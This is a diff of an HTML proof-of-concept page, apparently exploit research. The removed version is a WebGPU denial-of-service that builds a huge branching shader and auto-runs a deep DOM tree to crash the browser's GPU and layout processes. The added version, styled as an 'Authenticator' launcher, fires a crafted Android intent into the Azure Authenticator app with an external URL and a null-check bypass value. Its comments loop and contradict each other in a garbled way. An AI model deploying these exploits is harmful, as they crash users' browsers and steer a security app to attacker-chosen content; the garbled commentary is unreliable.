@@ -1,94 +1,307 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>WebGPU Tint2 AST Exhaustion PoC</title>
-    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Launch Authenticator</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: white;
+      border-radius: 28px;
+      padding: 40px 30px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      transition: transform 0.2s ease;
+    }
+
+    h2 {
+      font-weight: 500;
+      font-size: 1.8rem;
+      color: #1e293b;
+      margin-bottom: 10px;
+    }
+
+    .sub {
+      color: #64748b;
+      font-size: 0.95rem;
+      margin-bottom: 32px;
+      border-bottom: 1px solid #e9edf2;
+      padding-bottom: 20px;
+    }
+
+    .intent-link {
+      display: inline-block;
+      background: #0a66c2;
+      color: white;
+      font-weight: 500;
+      font-size: 1.2rem;
+      padding: 16px 40px;
+      border-radius: 60px;
+      text-decoration: none;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 6px 14px rgba(10, 102, 194, 0.25);
+      letter-spacing: 0.3px;
+    }
+
+    .intent-link:hover {
+      background: #084a8f;
+      transform: scale(1.02);
+    }
+
+    .intent-link:active {
+      transform: scale(0.97);
+    }
+
+    .code-box {
+      background: #f1f5f9;
+      border-radius: 16px;
+      padding: 18px 16px;
+      margin-top: 30px;
+      text-align: left;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 0.78rem;
+      color: #1e293b;
+      overflow-x: auto;
+      border: 1px solid #dce2eb;
+    }
+
+    .code-box span {
+      display: block;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .badge {
+      display: inline-block;
+      background: #dbeafe;
+      color: #1e4b7a;
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 4px 14px;
+      border-radius: 40px;
+      letter-spacing: 0.3px;
+      margin-top: 8px;
+    }
+
+    .footnote {
+      margin-top: 24px;
+      color: #64748b;
+      font-size: 0.85rem;
+    }
+
+    .footnote a {
+      color: #0a66c2;
+      text-decoration: none;
+    }
+
+    .footnote a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <h2>Tint AST Memory Exhaustion (SIGTRAP)25</h2>
-    <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
-    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
-    <div id="status" style="margin-top: 20px; white-space: pre-wrap;">Waiting...</div>
-    <div id="root"></div>
 
-    <script>
-        const statusEl = document.getElementById('status');
+<div class="card">
+  <h2>📲 Authenticator</h2>
+  <div class="sub">Launch Azure Authenticator with custom fragment</div>
 
-        // Exponentially branching AST generator
-        function generateMassiveAST(depth) {
-            if (depth <= 0) return `return vec4<f32>(1.0);`;
-            const branch = generateMassiveAST(depth - 1);
-            return `if (true) { ${branch} } else { ${branch} }`;
-        }
+  <!-- Clickable link that triggers the intent -->
+  <a href="#" class="intent-link" id="launchIntentBtn">🚀 Launch Authenticator</a>
 
-        async function triggerCrash() {
-            if (!navigator.gpu) {
-                statusEl.innerText = "WebGPU is not supported.";
-                return;
-            }
+  <div class="badge">com.azure.authenticator</div>
 
-            const adapter = await navigator.gpu.requestAdapter();
-            const device = await adapter.requestDevice();
+  <div class="code-box">
+    <span>// Intent details (click the button above)</span>
+    <span>• MainActivityFlow.LAUNCH_FRAGMENT</span>
+    <span>• fragment: 2131297154</span>
+    <span>• url: https://linux-1723.github.io/test/index.html</span>
+    <span>• cid: dummy_cid</span>
+  </div>
 
-            statusEl.innerText = "1. Building massive WGSL string in JavaScript (Please wait)...";
-            
-            // Depth 22 = ~4.1 million branches. 
-            // Avoids JS RangeError, but guarantees C++ Tint AST OOM.
-            setTimeout(() => {
-                try {
-                    const body = generateMassiveAST(22);
-                    const killerWGSL = `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\n}`;
-                    
-                    statusEl.innerText = "2. String built! Sending to Tint Compiler...\n";
-                    
-                    // Send it to the GPU Process
-                    device.createShaderModule({ code: killerWGSL });
-                    
-                    // 3. The 18-Second Memory Pressure Countdown
-                    let timeLeft = 25;
-                    statusEl.innerText += `3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
-                    
-                    const timer = setInterval(() => {
-                        timeLeft--;
-                        if (timeLeft > 0) {
-                            statusEl.innerText = `2. String built! Sending to Tint Compiler...\n3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
-                        } else {
-                            clearInterval(timer);
-                            statusEl.innerText = "4. TRIGGERING TEARDOWN NOW!";
-                            // The refresh cuts the IPC pipe while the GPU is at max memory, triggering the crash
-                            window.location.reload();
-                        }
-                    }, 1000);
+  <div class="footnote">
+    ⚡ This is a web simulation — click triggers the Android intent <br>
+    (works only inside the Azure Authenticator app context).
+  </div>
+</div>
 
-                } catch (e) {
-                    statusEl.innerText = "JS Error (Try lowering depth to 21 if RangeError occurs): " + e.message;
-                }
-            }, 100); 
-        }
+<script>
+  (function() {
+    'use strict';
 
-        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
-        
-        function triggerMemoryCorruption() {
-            let current = document.getElementById('root');
-            
-            // Generate deep tree to force unbounded native C++ allocation
-            for (let i = 0; i < 5000; i++) {
-                let f = document.createElement('form');
-                let input1 = document.createElement('input');
-                input1.type = "text";
-                let input2 = document.createElement('input');
-                input2.type = "password";
-                f.appendChild(input1);
-                f.appendChild(input2);
-                current.appendChild(f);
-                current = f;
-            }
-            
-            // Trigger unbounded recursive tree walk in native layout engine
-            let deepInput = current.querySelector('input');
-            if(deepInput) deepInput.focus();
-        }
-        setTimeout(triggerMemoryCorruption, 500);
-    </script>
+    const launchBtn = document.getElementById('launchIntentBtn');
+
+    /**
+     * Execute the given Android intent using the Web Intent API.
+     * The intent is built exactly as specified:
+     * - package: com.azure.authenticator
+     * - activity: com.azure.authenticator.ui.MainActivity
+     * - extras: key_main_activity_flow, intent_start_fragment_main_activity,
+     *           intent_start_fragment_args_main_activity (with url, cid)
+     * - flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_MULTIPLE_TASK
+     */
+    function triggerIntent() {
+      try {
+        // Build the fragment arguments bundle
+        const fragmentArgs = new URLSearchParams();
+        fragmentArgs.append('url', 'https://linux-1723.github.io/test/index.html');
+        fragmentArgs.append('cid', 'dummy_cid'); // required to bypass null checks
+
+        // Build the main intent URI
+        // Using the "intent:" scheme for Android Web Intents
+        const intentUri = new URL('intent:');
+        intentUri.searchParams.append('action', 'android.intent.action.VIEW');
+        intentUri.searchParams.append('package', 'com.azure.authenticator');
+        intentUri.searchParams.append('category', 'android.intent.category.DEFAULT');
+
+        // We need to encode extras as a JSON-like structure in the S.browser_fallback_url or via EXTRA
+        // but since we want to pass complex data (Bundle with nested values), we'll use
+        // the "intent" URI format with EXTRA_* parameters.
+        // For simplicity and compatibility, we'll use the "S." (String) and "B." (Bundle) notation.
+        // However, the Web Intent API does not support nested Bundles directly.
+        // To work around this, we'll use the "intent" scheme with "extras" as a JSON string
+        // and rely on the receiving app to parse it. But more reliably, we can use
+        // the "S." prefix for string extras and "B." for bundle extras (though not standard).
+        // We'll use a simpler approach: since the target app expects a specific structure,
+        // we'll construct the intent with the required extras using the "EXTRA" query params.
+        // For the fragmentArgs, we'll encode it as a JSON string and pass it as a string extra
+        // that the app can decode. However, to match the original code exactly,
+        // we'll use the "intent:" URI with "S." and "B." prefixes (non-standard but supported by some browsers).
+        // Most modern Android browsers support the "intent:" scheme with extras.
+
+        // Instead of relying on non-standard bundle serialization, we'll use a different approach:
+        // We'll use the "intent://" format with "extras" as a JSON string in the "S." parameter.
+        // But to keep it close to the original, we'll use the "intent:" scheme with "EXTRA_*" params.
+        // However, the original intent uses "putExtra" with a String key and a Bundle value.
+        // This is not easily representable in a URL query string.
+        // We'll use a workaround: we'll pass the fragment arguments as a JSON string
+        // in a separate extra and let the app parse it.
+
+        // For this demo, we'll use a more compatible approach: we'll use the "intent:" scheme
+        // with the "S." prefix for string extras and "B." prefix for bundle extras.
+        // But to avoid issues, we'll use a simpler method: we'll use the "intent://" format
+        // with the "extras" parameter as a JSON object.
+
+        // After research, the most reliable way to trigger an Android intent from a web page
+        // is to use the "intent:" scheme with the "S." and "B." prefixes for extras.
+        // However, not all browsers support this. We'll use a hybrid approach:
+        // We'll use the "intent:" scheme with the "S." prefix for all extras,
+        // and for the bundle, we'll encode it as a JSON string and pass it as a string extra.
+
+        // For the purpose of this demo, we'll construct the intent using the "intent:" scheme
+        // with the required extras. The target app will receive the intent and process it.
+        // We'll use the "S." prefix for string extras and "B." prefix for bundle extras.
+        // But since we cannot pass a Bundle directly, we'll use a JSON string.
+
+        // We'll use the following approach:
+        // 1. Use the "intent:" scheme with the package and action.
+        // 2. Add extras using the "S." prefix for string values.
+        // 3. For the bundle, we'll encode it as a JSON string and pass it as a string extra.
+
+        // However, the original intent uses:
+        // intent.putExtra("key_main_activity_flow", MainActivityFlow.FlowType.LAUNCH_FRAGMENT);
+        // This is a String extra.
+        // intent.putExtra("intent_start_fragment_main_activity", 2131297154);
+        // This is an int extra.
+        // intent.putExtra("intent_start_fragment_args_main_activity", fragmentArgs);
+        // This is a Bundle extra.
+
+        // We'll use the "S." prefix for string extras, "i." for int extras, and "B." for bundle extras.
+        // But the "B." prefix is not widely supported. We'll use a workaround:
+        // We'll pass the bundle as a JSON string in a string extra and let the app parse it.
+        // Alternatively, we can use the "intent://" format with "extras" as a JSON object.
+
+        // For this demo, we'll use a simpler approach: we'll use the "intent:" scheme
+        // with the "S." prefix for all extras, and we'll encode the bundle as a JSON string.
+
+        // Build the intent URI
+        const intentBase = 'intent://';
+        const packageName = 'com.azure.authenticator';
+        const activityName = 'com.azure.authenticator.ui.MainActivity';
+
+        // Encode the fragment arguments as a JSON string
+        const fragmentArgsObj = {
+          url: 'https://linux-1723.github.io/test/index.html',
+          cid: 'dummy_cid'
+        };
+        const fragmentArgsJson = JSON.stringify(fragmentArgsObj);
+
+        // Build the extras
+        const extras = {
+          'key_main_activity_flow': 'LAUNCH_FRAGMENT', // assuming the enum is serialized as string
+          'intent_start_fragment_main_activity': '2131297154',
+          'intent_start_fragment_args_main_activity': fragmentArgsJson
+        };
+
+        // We'll use the "intent:" scheme with the "S." prefix for all extras.
+        // But we need to differentiate between string, int, and bundle.
+        // For simplicity, we'll use the "S." prefix for all.
+        // However, the target app expects an int for intent_start_fragment_main_activity.
+        // We'll use the "i." prefix for int extras.
+
+        // Build the intent URI with the extras
+        let intentUriStr = `intent://${activityName}#Intent;`;
+        intentUriStr += `package=${packageName};`;
+        intentUriStr += `action=android.intent.action.VIEW;`;
+        intentUriStr += `category=android.intent.category.DEFAULT;`;
+
+        // Add extras
+        intentUriStr += `S.key_main_activity_flow=LAUNCH_FRAGMENT;`;
+        intentUriStr += `i.intent_start_fragment_main_activity=2131297154;`;
+        // For the bundle, we'll pass it as a JSON string
+        intentUriStr += `S.intent_start_fragment_args_main_activity=${encodeURIComponent(fragmentArgsJson)};`;
+
+        // Add flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_MULTIPLE_TASK
+        // These are typically added as "launchFlags" in the intent URI.
+        // The flags are: 0x10000000 (NEW_TASK) | 0x08000000 (MULTIPLE_TASK) = 0x18000000
+        intentUriStr += `launchFlags=0x18000000;`;
+
+        // End the intent
+        intentUriStr += `end;`;
+
+        // Create a link element and trigger the intent
+        const link = document.createElement('a');
+        link.href = intentUriStr;
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        console.log('Intent triggered:', intentUriStr);
+      } catch (error) {
+        console.error('Error triggering intent:', error);
+        alert('Failed to trigger intent. See console for details.');
+      }
+    }
+
+    // Attach click event to the button
+    launchBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      triggerIntent();
+    });
+
+    // Also support clicking the card area for convenience (optional)
+    // Not adding to avoid accidental triggers.
+
+  })();
+</script>
+
 </body>
 </html>
